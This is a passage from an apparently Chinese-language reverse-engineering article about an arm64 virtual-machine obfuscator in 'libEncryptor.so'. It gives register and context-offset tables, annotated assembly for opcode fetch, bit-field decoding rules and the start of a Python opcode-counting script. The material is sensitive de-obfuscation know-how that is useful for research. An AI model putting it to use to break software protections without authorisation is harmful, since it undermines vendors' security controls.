700;">负偏移指针</span>指向可使用内存最高上限的地址与vmMemoryLimit值相同，使用<span style="font-weight: 700;">负偏移</span>对上下文进行访问。</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x20</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">call_register_trampoline 跳板地址</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x21</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">Context，上下文指针</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x22</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table7</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x23</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table6</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w24</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">默认为1</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x25</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table5</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x26</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table3</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x27</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table_main</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x28</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table2</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x29(fp)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">未使用</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x30(lr)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">switch_table_4(3A)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr></tbody></table></li><li style="margin-left: 2px;"><table width="1599"><thead style="background-color: rgb(217, 226, 223);"><tr style="border-top: 1px solid rgb(198, 203, 209);"><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">虚拟机context<br />虚拟机中也有专用寄存器，在调用外部函数时，其中<code style="font-family: Consolas, Monaco, ;">x4</code>虚拟机中保存外部函数地址，<code style="font-family: Consolas, Monaco, ;">x5</code>虚拟机中保存参数指针，<code style="font-family: Consolas, Monaco, ;">x25</code>虚拟机中调用外部函数时的跳板地址。另外虚拟寄存器和aarch64中的寄存器并不是一一对应的，在这里只是对每个虚拟寄存器启了一个相应的名字方便理解和记忆。</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">负偏移</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">虚拟寄存器</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">注释</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x150</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟机堆栈SP初始位置</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x148</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x140</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x138</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pc</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pc指针，真实寄存器x21中的值指向此地址，handler使用</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x130</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">初始化值:0,虚拟机中开始到结束始终为0，XZR寄存器?</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x128</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x1</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x120</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x2</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x118</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x3</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x110</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x4</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">初始化值：pBufferInfo，专用寄存器：虚拟机中调用外部函数时保存外部函数地址</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x108</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x5</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">初始化值: 0，专用寄存器：虚拟机中调用外部函数时保存参数指针</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x100</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x6</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">初始化值: vm2_external_func_list</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xF8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x7</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">初始化值: call_register_trampoline_function</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xF0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xE8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x9</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xE0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x10</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xD8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x11</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xD0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x12</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xC8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x13</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xC0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x14</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xB8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x15</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xB0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x16</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xA8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x17</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0xA0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x18</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x98</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x19</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x90</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x20</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x88</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x21</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x80</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x22</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x78</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x23</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x70</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x24</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x68</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x25</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟机中的专用寄存器：虚拟机中调用外部函数时的跳板地址</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x60</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x26</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x58</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x27</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x50</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x28</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x48</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x29(SP)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟机堆栈SP, 初始化时指向-0x150</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x40</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x30</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x38</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x31(LR)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">当值为0时退出虚拟机</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x30</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x28</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x20</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">流程控制状态标记，值范围0-3，0:正常执行状态,2和3:程序中包含分支跳转某种流程,3和1:call某个地址函数</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x18</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">new pc/call某个地址函数的地址/为0时退出虚拟机</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x10</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">LR,在调用调用函数结束后返回虚拟机地址</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">-0x8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">起始pc指针，一部分分支跳转指令参考的起始基址，例如: 跳转目标地址=pc起始地址+offset</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr></tbody></table></li></ul><h2>取指</h2><p>pOpcode取出4个字节的opcode并取得低5位解码出op1。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"># 初始化<br />LDP             X<span style="color: rgb(255, 115, 253);">20</span>, X<span style="color: rgb(255, 115, 253);">19</span>, [X<span style="color: rgb(255, 115, 253);">4</span>]              <span style="color: rgb(146, 255, 184);">;x20:call_register_trampoline,0x19:pVmMemoryLimit</span><br />SUB             X<span style="color: rgb(255, 115, 253);">21</span>, X<span style="color: rgb(255, 115, 253);">19</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">138</span>        <span style="color: rgb(146, 255, 184);">;x19-0x138=x21计算出pc指针在负偏移指针的内存位置</span><br />STR             X<span style="color: rgb(255, 115, 253);">0</span>, [X<span style="color: rgb(255, 115, 253);">21</span>]                      <span style="color: rgb(146, 255, 184);">;保存pc到x21，此时x0和x21中的值相同并被关联。</span># 取opcode<br />LDR            W<span style="color: rgb(255, 115, 253);">12</span>, [X<span style="color: rgb(255, 115, 253);">0</span>]                    <span style="color: rgb(146, 255, 184);">;取出4字节opcode</span><br />AND           W<span style="color: rgb(255, 115, 253);">10</span>, W<span style="color: rgb(255, 115, 253);">12</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">3</span>F       <span style="color: rgb(146, 255, 184);">;opcode的低5位为op1</span><br />CMP           W<span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">3</span>F                <span style="color: rgb(146, 255, 184);">;op1的值最大只能小于63，说明op1只有0-63一共64个</span><br />B.HI            next_pc                      <span style="color: rgb(146, 255, 184);">;下一条指令</span></code></pre><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a0a40619&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B38YJBSPhicSDayVyunqAeYWaEzokEFVdman6dBk74MebLBOgLOtn1tmA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><h2>解码和分发</h2><h3>首次解码</h3><p>在opcode<span style="font-weight: 700;">首次解码</span>时会解码4个寄存器操作数，从中提取4个位域的字段，分别保存到<span style="font-weight: 700;">真实专用寄存器</span>w8、w9、w10、w11，在arm64指令集中当指令是MADD、MSUB、UMADDL、UMSUBL、SMADDL、SMADDL等会有4个寄存器操作数的情况，在这里同样也是如此。首次解码时位域布局：w12[31,30-26,25-21,20-16,15-12,11-6,5-0]w12[5-0:6] = op1w12[11-6:6] = op2w12[15-12:4]|[31:1] = Xm/Wmw12[20-16:5] = Xt/Wtw12[25-21:5] = Xn/Wnw12[30-26:5] =Xa/Wa<br /><code style="font-family: SFMono-Regular, Consolas, ;">w8</code>:  Rd(Xt/Wt)目标寄存器操作数，w12[20-16-&gt;5-0]，取出16-20位保存最低位，5位可以表示0-31个寄存器。<br /><code style="font-family: SFMono-Regular, Consolas, ;">w9</code>:  Rn(Xn/Wn)(第一个源寄存器操作数，w12[25-21-&gt;5-0]，取出21-25位保存最低位，5位可以表示0-31个寄存器。<br /><code style="font-family: SFMono-Regular, Consolas, ;">w10</code>: Rm(Xm/Wm)第二个源寄存器操作数，w12[15-&gt;4] | w12[14-&gt;3] | w12[13-&gt;2] | w12[12-&gt;1] | w12[31-&gt;0]，5位可以表示0-31个寄存器。<br /><code style="font-family: SFMono-Regular, Consolas, ;">w11</code>: Ra(Xa/Wa)第三个源寄存器操作数，w12[30-&gt;4] | w12[29-&gt;3] | w12[28-&gt;2] | w12[27-26-&gt;1-0]，5位可以表示0-31个寄存器。寄存器操作数伪代码表示如下:<br /><code style="font-family: SFMono-Regular, Consolas, ;">操作数大小</code>: X为64位操作数、W为32位操作数。<br /><code style="font-family: SFMono-Regular, Consolas, ;">目标操作数</code>: d=destination register, t=target register。<br /><code style="font-family: SFMono-Regular, Consolas, ;">源寄存器</code>：第一个源寄存器为n，第二个寄存器为m，第三个寄存器为a。<br /><code style="font-family: SFMono-Regular, Consolas, ;">R</code>: 表示寄存器64或32位操作数，X是64位操作数、W代表32位操作数。<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ab521c63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B34HRKpDrmjXibCuaJ7Z0mr9ZUWunZeA8iafhbWuL1iclEoZu60LGntibruA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><h3>分发和二次解码</h3><p>在高级语言中如果一个switch太多，在某些编译器编译优化后出现在多张switch子表和子表的子表的情况，对于一些相同代码的多个case会合并到一个case中再次switch分发的情况。根据编译器的优化编译的特性，在处理switch的case为了减少查找次数找到最终的case，在代码中会经常看到大于(GT)、小于(LE)等分支跳转，看到这个不要迷惑，这是编译器优化case的结果，这样做的目的是减少查找次数使用了类似二分查找的算法，当看到B.EQ的跳转目标和B.NE的下一条指令就是匹配到了case常量了。<br />在<span style="font-weight: 700;">首次解码</span>后分发过程中通常还会有<span style="font-weight: 700;">二次解码</span>，除了MADD和MSUB等等指令有4个寄存器操作数，指令只需一般指令只有2-3个寄存器操作数，一条完整的arm64指令至少需要二个寄存器操作数，这里也同样如此，当指令只有二个寄存器操作数时即一个目标操作数Xt和第一个源操作数Xn，其他的位域字段就会空闲下来，例如：op2、Xm、Xa，在二次解码时这些空闲的位域字段原有的值就会覆盖被再次利用组成其他寻址方式例如：shift、extend、imm等等。在虚拟机指令op1的值是11(0xb)时，分发处理会解码op2，解码op2时Xt、Xn、Xm等操作数位置会发生变化，原有的x10/w10第三个源操作数在op2中变成目标操作数，第一个源操作数变成x8/w8，第二个源操作数变成x9/w9，各操作数的位域解码方式不变，变的只是操作数角色。<br /><code style="font-family: SFMono-Regular, Consolas, ;">Xt</code>：Rd(Xt/Wt)目标寄存器操作数(x10/w10)，w12[15-&gt;4] | w12[14-&gt;3] | w12[13-&gt;2] | w12[12-&gt;1] | w12[31-&gt;0]，5位可以表示0-31个寄存器。<br /><code style="font-family: SFMono-Regular, Consolas, ;">Xn</code>: Rn(Xn/Wn)(第一个源寄存器操作数(x8/w8)，w12[20-16-&gt;5-0]，取出16-20位保存最低位，5位可以表示0-31个寄存器。<br /><code style="font-family: SFMono-Regular, Consolas, ;">Xm</code>: Rm(Xm/Wm)第二个源寄存器操作数(x9/w9)，w12[25-21-&gt;5-0]，取出21-25位保存最低位，5位可以表示0-31个寄存器。</p><h2>执行</h2><p>从op1的取值范围为0-63一共64条指令，当op1是11时还有存在op2和op3的情况，由于虚拟机的handler太过庞大分析所有的指令太过耗时，我们目的是还原代码逻辑，只需分析执行过的handler，对于没有执行过的handler放弃分析。<br />在了解了op1解码方式后，通过脚本得到执行次数最多的指令并优先分析：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> struct<br />pcode_start = <span style="color: rgb(255, 115, 253);">0xB090</span><br />pcode_size = <span style="color: rgb(255, 115, 253);">0x2D8</span><br /><span style="color: rgb(150, 203, 254);">with</span> open(<span style="color: rgb(168, 255, 96);">"libEncryptor.so"</span>, <span style="color: rgb(168, 255, 96);">"rb"</span>) <span style="color: rgb(150, 203, 254);">as</span> f:        content = f.read()bytes_code = content[pcode_start : pcode_start + pcode_size]insts_sets = {}<br /><span style="color: rgb(150, 203, 254);">for</span> pc <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0</span>, pcode_size, <span style="color: rgb(255, 115, 253);">4</span>):<br />    word = 